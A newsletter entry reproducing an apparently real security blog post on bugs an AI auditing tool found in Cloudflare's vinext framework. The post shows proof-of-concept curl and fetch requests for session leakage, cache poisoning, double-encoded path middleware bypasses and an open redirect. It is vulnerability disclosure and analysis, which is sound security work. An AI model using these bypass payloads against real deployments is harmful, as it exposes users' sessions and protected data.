---
type: twir-item
issue: 271
item: 2
item_type: item
date: 2026-03-04
source: https://www.hacktron.ai/blog/hacking-cloudflare-vinext
tags:
  - "Nextjs"
  - "Vibe-Hacking"
  - "Vibe-Coded"
  - "Vinext"
status: auto
quality: keep
---

[[2026-03-04-TWIR-271|Index]]

# Item 2: Vibe-Hacking Cloudflare's Vibe-Coded Next.js Replacement

Source: [https://www.hacktron.ai/blog/hacking-cloudflare-vinext](https://www.hacktron.ai/blog/hacking-cloudflare-vinext)

Summary:
This post analyzes the security implications of Cloudflare’s AI-generated vinext, highlighting that while AI can rapidly produce code that passes functional tests, it often misses vulnerabilities that exist in untested or complex interaction spaces. The author used Hacktron to audit vinext and found multiple critical bugs, many stemming from concurrency and context management issues, such as session leakage between users. The piece argues that as AI-generated code accelerates, security review must also leverage AI to keep pace, but human judgment remains essential for triage and severity assessment.

Key takeaways:
- AI-generated code can quickly achieve functional parity but may introduce subtle security flaws, especially in concurrency and context handling.
- Security vulnerabilities often exist outside the scope of functional tests, requiring adversarial and inference-driven review.
- Automated tools can surface many issues, but human expertise is still needed to assess impact and prioritize fixes.

Recommendation:
Read fully (especially for those interested in AI-generated code, security, or framework internals)

Why it matters:
especially for those interested in AI-generated code, security, or framework internals

Content:
# vinext: Vibe-Hacking Cloudflare's Vibe-Coded Next.js Replacement

index

In case you haven’t seen the lore, Cloudflare [built](https://blog.cloudflare.com/vinext/) a Next.js replacement called [vinext](https://github.com/cloudflare/vinext) in a week with one engineer for like $1100?. I’m sure it’s not a full drop-in replacement yet, but it’s still an insane showcase of what current models can do. If the problem is well-specified and you give it tight test cases as feedback, the model will happily crank out code that passes.

The catch is most of the tests driving vinext are functional requirements. “Make it behave like X,” “match these outputs,” “pass these cases.” Vulnerabilities do not live there. They live in the negative space, and in complex interactions between layers, the stuff nobody wrote a test for.

So even if Next.js has a solid implementation for a specific feature, often because someone already found a vulnerability and it got patched, that security does not automatically transfer to a fresh reimplementation with different abstracts.

The model’s objective is not “be secure.” It is “pass the tests,” and it will take whatever route gets it there. Nobody is writing a test case for a weird parser differential between middleware and the router.

So when I saw this announcement on X, I knew it was going to be a goldmine. We ran Hacktron against vinext to hunt for that negative space, and in this post I’ll walk through some of the interesting bugs it found. But first, a quick detour on why complex vibe-coded projects are structurally vulnerable, and why securing them requires equally costly vibe-hacking or even more.

## Security and Inference

Developing is constraint solving. Whether it’s an LLM or a human, the task is to make the requirements work, ship the feature, pass the tests, satisfy the spec.

Hacking on the other hand is opposite. You search for broken assumptions and forbidden states in the negative space which is vast, therefore fundamentally more inference-intensive than programming.

> be conservative in what you do, be liberal in what you accept from others. - a hacker’s best friend <https://www.rfc-editor.org/rfc/rfc761#section-2.10>

Think about why Signal is considered secure. It’s not one brilliant design decision. Every layer of it has had an insane amount of adversarial attention from [cryptographers, security auditors, and researchers](https://community.signalusers.org/t/overview-of-third-party-security-audits/13243) over years, and its attack surface is relatively narrow compared to something like a web framework. That’s thousands of hours of humans thinking about the negative space of a well-scoped problem. And I’m not saying it’s unbreakable. A nasty bug can still surface when someone throws more inference at the right seam, or when a new feature introduces an interaction nobody expected.

When something gets built in a week with AI like vinext, odds are it ships with vulnerabilities, so deploying it blindly on day one is a bad idea. It’s not that “LLM code is bad.” First versions written by humans are just as fragile. In our audits, v1 is almost always the easy target. Now, LLM speed just widens the gap.

Now the obvious question is, how do you audit something like this at the same speed it’s being shipped? This pace is basically inevitable from now on.

The answer is you need the same kind of AI on the other side, but aimed at the negative space. You can’t brute-force the whole state space, so you rely on heuristics that steer the search into the high-risk areas. And like most inference-heavy problems, it scales with compute, more tokens, more coverage, more bugs.

## Vulnerabilities

The moment I saw the announcement on Twitter, I gave Hacktron context describing the attack surface to look for and went to sleep. It came back with 45 findings. After dropping low-severity issues and a few false positives, the 24 below are the ones I manually validated. Many share the same root cause (race conditions, parser differentials); a few are just code-quality issues. The model often misassigns severity, so take the labels with a grain of salt, but the Criticals are genuinely critical.

Throughout the whole workflow, finding bugs is the easy part, the agent will find plenty. The hard part is deciding which ones matter, and that depends on the environment. If the right setup is in place, the agent can triage on its own. Most of the time it’s not, and that last mile of severity judgment still needs a human, whether that’s a developer or a security researcher at the company, to validate it.

I held off reporting for a day and tried reaching the repo owner on Twitter because I was thinking of bundling everything into one big report, but interestingly, Vercel’s security team independently flagged a few of the same bugs, and Cloudflare started patching. I reported through security@, HackerOne, and GitHub. I also wasn’t given disclosure permission, but honestly, we’re in wild times. Traditional 90-day disclosure policies aren’t going to hold up when things are shipping at this speed. FWIW, I didn’t get any acknowledgement on GitHub or HackerOne that my reports were received, but the issues did get fixed on GitHub, which is good.

| # | Severity | Title | Status |
| --- | --- | --- | --- |
| 1 | Critical | Race Condition in Private Cache via Unsafe AsyncLocalStorage Fallback |  |
| 2 | Critical | Cross-Request State Pollution in SSR via Missing AsyncLocalStorage Shim |  |
| 3 | Critical | Race Condition in Global Fallback State leads to Session Hijacking |  |
| 4 | Critical | Unsafe Global Fallback in Navigation State Leading to Cross-Request Data Leak |  |
| 5 | High | Shared Cache Poisoning via Missing Auth Header Heuristics |  |
| 6 | High | ACL Bypass and Path Traversal via Unsafe URL Decoding in Router |  |
| 7 | High | Path Confusion and Middleware Bypass via Premature URI Decoding |  |
| 8 | High | Authorization and Routing Bypass via Path Normalization Discrepancy |  |
| 9 | High | Reverse Proxy Path Traversal and Routing Bypass via Catch-All Route Confusion |  |
| 10 | High | SSRF and Routing Bypass via Path Traversal in matchConfigPattern |  |
| 13 | High | Insecure Default Middleware Exclusion for API Routes |  |
| 15 | Low | ReDoS Protection Bypass in isSafeRegex via Alternation |  |
| 18 | Informational | Remote Code Execution via Path Injection in startLocalServer [negligible severity] |  |
| 19 | Informational | Path Traversal in Static Export Output Generation [negligible severity] |  |
| 23 | Low | Build-Time Resource Exhaustion and Cache Pollution via Analytics Poisoning |  |
| 24 | Low | Cache Poisoning via Non-Cryptographic Hash Collision in ISR Cache [hard to exploit] |  |

Now, let’s see the top five bugs. You can read the full details of the scan here <https://app.hacktron.ai/disclosed/pentests/web_Y2xvdWRmbGFyZS92aW5leHQ_1772212820941_j0huwpwie>.

## 1. Your session is someone else’s session

This is the nastiest one.

Vite keeps RSC and SSR in separate sandboxes that can’t share variables, so vinext used Node’s `AsyncLocalStorage` to pass request data between them. There are two ways to use it: `run()` creates an isolated box per request, `enterWith()` just stamps data onto whatever’s running right now. The model picked `enterWith()` because it’s simpler and all tests passed, but the tests only send one request at a time. In production with concurrent traffic, one user’s request can read another user’s auth token.

```
return _als.getStore() ?? _fallbackState;
```

When `getStore()` returns `undefined`, every request reads from and writes to the same shared `_fallbackState` object. On Cloudflare Workers, `enterWith()` is unavailable. `getStore()` returns `undefined`. The fallback fires on every single request, on every deployment, by default.

So when concurrent requests are in-flight and any of them yields at an `await`, the next request overwrites `_fallbackState` with its own context. When the first request resumes and calls `headers()` or `cookies()`, it reads the second request’s state.

User A gets User B’s session cookie. User B sees User A’s search params. Admin’s cached data gets served to an anonymous user.

```
rm -f /tmp/alice_*.html /tmp/bob_*.html

curl -s -k -H "cookie: session=sess_admin_9f8a2b" \

"https://poc-race-demo.mohan-a10.workers.dev/dashboard" \

curl -s -k -H "cookie: session=sess_user_3c7d1e" \

"https://poc-race-demo.mohan-a10.workers.dev/dashboard" \

grep -rl 'Alice' /tmp/bob_*.html   # Bob got Alice's data

grep -rl 'Bob' /tmp/alice_*.html   # Alice got Bob's data
```

---

## 2. Poison Cache for everyone

Consider the following standard Next.js pattern, you fetch user data from an internal API and cache it with tags:

```
export async function GET(request: Request) {

const res = await fetch("https://api.internal/user/profile", {

headers: { Authorization: request.headers.get("Authorization")! },

next: { tags: ["profile"], revalidate: 60 },

return Response.json(await res.json());
```

Each user sends their own `Authorization` header, so each user should get their own profile back. On Next.js, this works. On vinext, the first user’s response gets served to everyone.

vinext’s patched fetch caches the response, but the cache key is built from the URL, HTTP method, and request body. What’s not in the key? Request headers.

```
// What buildFetchCacheKey includes:

// ✗ Authorization header  ← missing

// ✗ Cookie header          ← missing
```

So a request with `Authorization: Bearer alice` and one with `Authorization: Bearer bob` to the same URL produce the same cache key. Whoever hits the endpoint first, their response gets served to everyone else on that isolate.

```
const URL = "https://acme-financial-portal.mohan-a10.workers.dev/api/cached-profile";

const alice = await (await fetch(URL, {

headers: { Authorization: "Bearer alice" }

const bob = await (await fetch(URL, {

headers: { Authorization: "Bearer bob" }

const anon = await (await fetch(URL)).json();

console.log("Alice:", alice.profileData.uuid);

console.log("Bob:  ", bob.profileData.uuid);

console.log("Anon: ", anon.profileData.uuid);

// All same UUID — Alice's data served to everyone
```

It was not in Next.js test cases, it is an undocumented heuristic: if a request contains `Authorization` or `Cookie` headers, it automatically opts out of shared caching and includes auth-relevant headers in the cache key. This isn’t in any API docs. It’s an invisible invariant that evolved from production incidents. When you reimplement `fetch()` caching from the API spec, this rule doesn’t exist, hence the bug

---

## 3. Your middleware doesn’t protect what you think it does

Say you write a standard auth middleware for your admin panel. Pretty basic.

```
export function middleware(request: NextRequest) {

if (request.nextUrl.pathname.startsWith("/admin")) {

const token = request.cookies.get("session");

if (!token) return NextResponse.redirect(new URL("/login", request.url));
```

You expect if you hit `/admin` without a session cookie, you get bounced to `/login`.

Except vinext’s request pipeline calls `decodeURIComponent()` twice at different stages, and passes the half-decoded request to middleware in between. Middleware sees the encoded path, fails to match, and skips auth. The router then fully decodes and serves the protected page.

```
app-router-entry.ts:  decode("/%2561dmin") → "/%61dmin"

middleware:           pathname = "/%61dmin"

startsWith("/admin") → FALSE

app-dev-server.ts:    decode("/%61dmin") → "/admin"

matchRoute:           "/admin" → MATCH → page served ✓
```

There’s one more variant, path traversal via double-encoded slash.

```
Request: GET /foo/..%252fadmin

Entry decode:    /foo/..%2fadmin

Middleware:      sees /foo/..%2fadmin → no match → passes through

Handler decode:  /foo/../admin

Normalize:       /admin → page served
```

```
# Blocked — middleware works as expected:

$ curl -s -o /dev/null -w "%{http_code}" \

"https://acme-financial-portal.mohan-a10.workers.dev/admin"

302  # redirected to /login

# Bypass — double-encode 'a':

$ curl -s -o /dev/null -w "%{http_code}" \

"https://acme-financial-portal.mohan-a10.workers.dev/%2561dmin"

200  # admin panel served, no auth

# Path traversal from any prefix:

$ curl -s -o /dev/null -w "%{http_code}" \

"https://acme-financial-portal.mohan-a10.workers.dev/foo/..%252fadmin"
```

| Request | Expected | Actual |
| --- | --- | --- |
| `GET /admin` | 302 | 302 |
| `GET /%2561dmin` | 302 | **200** |
| `GET /api/health/..%252fadmin` | 302 | **200** |
| `GET /foo/..%252fadmin` | 302 | **200** |

Next.js has one request handler that decodes the URL once and passes the same object through every stage. vinext has five separate entry points. `app-router-entry.ts` decodes once. The generated RSC entry in `app-dev-server.ts` decodes again. Middleware sits between them seeing the half-decoded URL. The model wrote correct code at each layer, the layers just disagree on what the URL is. classic PARSER DIFFERENTIALS

---

## 4. The image optimizer: Open Redirect and No ACL

The `/_vinext/image` endpoint runs before middleware. If the image transformation fails (say, you asked it to “optimize” a PDF), the catch block serves the raw file anyway:

```
const transformed = await handlers.transformImage(source.body, { width, format, quality });

return new Response(transformed.body, { status: 200, headers });

// Fall through to serve original

return new Response(source.body, { status: 200, headers });
```

```
$ curl -s "https://target.com/_vinext/image?url=/secret.txt&w=100"

# 200 — raw file served, middleware never ran
```

Same endpoint also has an open redirect. The validation checks `url` starts with `/` and not `//`. But `/\example.com` passes — backslash isn’t a slash. Browsers normalize `\` to `/`, so it becomes `//example.com` and redirects to the attacker’s domain.

```
$ curl -v "https://target.com/_vinext/image?url=/\example.com&w=100"
```

---

## 5. Your API routes have no middleware and you don’t know it

In Next.js, if you don’t define a `matcher` in your middleware config, middleware runs on **all routes**, including `/api/*`. That’s how global auth works. You write one middleware, it protects everything.

vinext silently excludes `/api` routes from middleware by default:

```
return !pathname.startsWith("/_next")

&& !pathname.startsWith("/api")   // ← silently skipped

&& !pathname.includes(".")

&& pathname !== "/favicon.ico";
```

If you’re migrating from Next.js or just following the docs, your global auth middleware quietly stops protecting every API endpoint. Your `/api/user/private-data` route is wide open.

```
# Page route — middleware runs, auth checked:

$ curl -s -o /dev/null -w "%{http_code}" "https://target.com/dashboard"

302  # redirected to /login

# API route — middleware silently skipped:

$ curl -s "https://target.com/api/user/private-data"

# 200 — data returned, no auth check
```

## Conclusion

Vibe-coding makes software easier to build. Vibe-hacking doesn’t scale the same way. The more code you ship, the more the search space grows, and you need to throw proportional inference at it. If your adversary has even slightly more resources, odds are they find what you missed.

Further, we benchmarked across multiple models internally. Gemini 2.5 Pro with Hacktron turned out to be the most cost-effective, catching everything the other models found. Opus 4.6 was the most expensive and missed a lot. GPT 5.2 is the worst performing one.

Meet our team at [**hacktron.ai**](https://hacktron.ai/). Reach out at [**hello@hacktron.ai**](mailto:hello@hacktron.ai) or [**hacktron.ai/calendar**.](https://www.hacktron.ai/calendar)
